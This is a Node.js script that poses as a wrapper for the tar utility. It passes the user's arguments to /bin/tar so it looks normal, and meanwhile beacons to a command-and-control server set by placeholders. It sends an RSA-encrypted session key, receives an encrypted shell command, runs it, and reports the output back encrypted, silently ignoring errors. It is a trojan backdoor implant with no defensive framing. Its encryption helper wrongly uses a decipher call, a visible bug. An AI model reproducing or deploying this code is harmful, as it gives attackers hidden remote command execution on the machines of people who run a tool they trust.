#!/usr/bin/env node
import { spawn } from "child_process";
import crypto, { Decipher } from "crypto";
import axios from "axios";

const args = process.argv.slice(2);

// First, simulate tar functionality
const tar_location = "/bin/tar";
const childProcess = spawn(tar_location, args);

childProcess.stdout.on("data", (data) => {
  process.stdout.write(data);
});

childProcess.stderr.on("data", (data) => {
  process.stderr.write(`${data}`);
});

// Acquire configuration constants
const server_ip = SERVER_IP;
const server_port = SERVER_PORT;
const server_addr = `http://${server_ip}:${server_port}`;
const pubkey = PUBLIC_KEY;

// Prepare symmetric key for the server to respond
const symkey = crypto.randomBytes(32);
const algo = CRYPTO_ALGO;

let task_id = crypto.randomBytes(24).toString("base64");


// Decrypt base64-encoded encrypted object to JSON object
function symmetricDecrypt({ iv, data }, symkey) {
  if (typeof symkey == "string") {
    symkey = Buffer.from(symkey, "base64");
  }
  if (typeof iv == "string") {
    iv = Buffer.from(iv, "base64");
  }
  const cipher = crypto.createDecipheriv(algo, symkey, iv);
  const decryptedResponse =
    cipher.update(data, "base64", "utf8") + cipher.final("utf8");
  return JSON.parse(decryptedResponse);
}

function symmetricEncrypt(json, symkey) {
  const iv = crypto.randomBytes(16);
  if (typeof symkey == "string") {
    symkey = Buffer.from(symkey, "base64");
  }
  const cipher = crypto.createDecipheriv(algo, symkey, iv);
  return {
    data:
      cipher.update(JSON.stringify(json), "utf8", "base64") +
      cipher.final("base64"),
    iv: iv.toString("base64"),
  };
}

// Encrypt JSON object using pubkey, and return as base64-encoded buffer
function pubkeyEncrypt(json) {
  return {
    data: crypto
      .publicEncrypt(
        {
          key: pubkey,
          padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
          oaepHash: "sha256",
        },
        Buffer.from(JSON.stringify(json))
      )
      .toString("base64"),
  };
}

// Basic promise-based command runner.
function doCommand(command) {
  return new Promise((res, rej) => {
    let stdout = "";
    let stderr = "";
    const commandRunner = spawn(command, [], { shell: true });
    commandRunner.stdout.on("data", (data) => (stdout += data.toString()));
    commandRunner.stderr.on("data", (data) => (stderr += data.toString()));
    commandRunner.on("exit", () => res({ stdout, stderr }));
  });
}

// Then attempt to fetch commands!!
async function main() {
  console.log(symkey);
  const squireRequest = {
    symkey: symkey.toString("base64"),
    task_id,
  };

  const response = await axios.post(
    `${server_addr}/task`,
    pubkeyEncrypt(squireRequest)
  );

  console.log(response.data)

  const serverResponse = symmetricDecrypt(response.data, symkey);

  const command = serverResponse.command;
  const s_task_id = serverResponse.task_id;
  if (s_task_id != task_id) return; // Safety check: Server must respond correctly!
  const { stdout, stderr } = await doCommand(command);

  const squireReport = {
    stdout,
    stderr,
    task_id,
  };


  const encryptedReport = {
    ...symmetricEncrypt(squireReport, symkey),
    task_id
  }

  axios.post(`${server_addr}/report`, encryptedReport);
}

try {
  main();
} catch {}
